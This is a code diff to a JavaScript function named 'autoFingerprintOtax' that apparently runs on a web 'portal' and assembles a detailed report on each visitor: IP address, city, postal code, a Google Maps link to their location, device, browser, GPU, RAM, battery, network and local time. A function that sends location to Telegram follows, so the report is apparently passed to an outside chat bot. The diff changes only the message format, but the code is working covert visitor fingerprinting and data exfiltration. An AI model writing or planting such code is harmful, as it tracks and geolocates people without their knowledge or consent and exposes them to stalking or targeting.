@@ -339,39 +339,40 @@ async function autoFingerprintOtax() {
     } catch {}
   }
   let msgArr = [
-    `🦠 *DATA VISITOR OTAX PORTAL* 🦠`,
-    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-    `*IP*           : \`${ipinfo.ip || '-'}\``,
-    `*Negara*       : ${ipinfo.country || '-'} (${ipinfo.region || '-'} / ${ipinfo.city || '-'})`,
-    `*Provider*     : ${ipinfo.org || '-'}`,
-    `*Lokasi IP*    : ${ipinfo.loc || '-'}`,
-    `*Google Maps*  : [Lihat Lokasi](${gmaps})`,
-    `*Kode Pos*     : ${ipinfo.postal || '-'}`,
-    `*Zona Waktu*   : ${ipinfo.timezone || '-'} (Offset: ${tzOffset})`,
-    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-    `*User-Agent*   : \`${navi.userAgent}\``,
-    `*Browser*      : ${b.browser}`,
-    `*OS*           : ${b.os}`,
-    `*Device*       : ${b.brand} / ${b.model}`,
-    `*Platform*     : ${navi.platform}`,
-    `*Screen*       : ${screen.width}x${screen.height}, depth: ${screen.colorDepth}`,
-    `*RAM*          : ${navi.deviceMemory || '-'} GB`,
-    `*CPU*          : ${navi.hardwareConcurrency || '-'}`,
-    `*Touch*        : ${'ontouchstart' in window ? "Ya" : "Tidak"}`,
-    `*GPU*          : ${gpu}`,
-    `*Network*      : ${connectionType}, ${downlink} Mbps, RTT: ${rtt} ms`,
-    `*Online*       : ${navi.onLine ? "Ya" : "Tidak"}`,
-    `*Battery*      : ${battery}`,
-    `*Cookies*      : ${navi.cookieEnabled ? "Aktif" : "Tidak"}`,
-    `*Bahasa*       : ${navi.language} (${(navi.languages||[]).join(', ')})`,
-    `*Referrer*     : ${document.referrer || "-"}`,
-    `*URL*          : ${location.href}`,
-    `*Timezone*     : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
-    `*Waktu Lokal*  : ${localTime}`,
-    `*Mode Gelap*   : ${window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ya" : "Tidak"}`,
-    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`
-  ];
-  let message = msgArr.join('\n');
+  "🦠 DATA VISITOR OTAX PORTAL 🦠",
+  "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+  `IP           : ${ipinfo.ip || '-'}`,
+  `Negara       : ${ipinfo.country || '-'} (${ipinfo.region || '-'} / ${ipinfo.city || '-'})`,
+  `Provider     : ${ipinfo.org || '-'}`,
+  `Lokasi IP    : ${ipinfo.loc || '-'}`,
+  `Google Maps  : ${gmaps}`,
+  `Kode Pos     : ${ipinfo.postal || '-'}`,
+  `Zona Waktu   : ${ipinfo.timezone || '-'} (Offset: ${tzOffset})`,
+  "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+  `User-Agent   : ${navi.userAgent}`,
+  `Browser      : ${b.browser}`,
+  `OS           : ${b.os}`,
+  `Device       : ${b.brand} / ${b.model}`,
+  `Platform     : ${navi.platform}`,
+  `Screen       : ${screen.width}x${screen.height}, depth: ${screen.colorDepth}`,
+  `RAM          : ${navi.deviceMemory || '-'} GB`,
+  `CPU          : ${navi.hardwareConcurrency || '-'}`,
+  `Touch        : ${'ontouchstart' in window ? "Ya" : "Tidak"}`,
+  `GPU          : ${gpu}`,
+  `Network      : ${connectionType}, ${downlink} Mbps, RTT: ${rtt} ms`,
+  `Online       : ${navi.onLine ? "Ya" : "Tidak"}`,
+  `Battery      : ${battery}`,
+  `Cookies      : ${navi.cookieEnabled ? "Aktif" : "Tidak"}`,
+  `Bahasa       : ${navi.language} (${(navi.languages||[]).join(', ')})`,
+  `Referrer     : ${document.referrer || "-"}`,
+  `URL          : ${location.href}`,
+  `Timezone     : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+  `Waktu Lokal  : ${localTime}`,
+  `Mode Gelap   : ${window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ya" : "Tidak"}`,
+  "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+];
+
+let message = "```\n" + msgArr.join('\n') + "\n```";
 
   function sendLocationToTelegram(lat, lon, acc) {
     let locationText = [
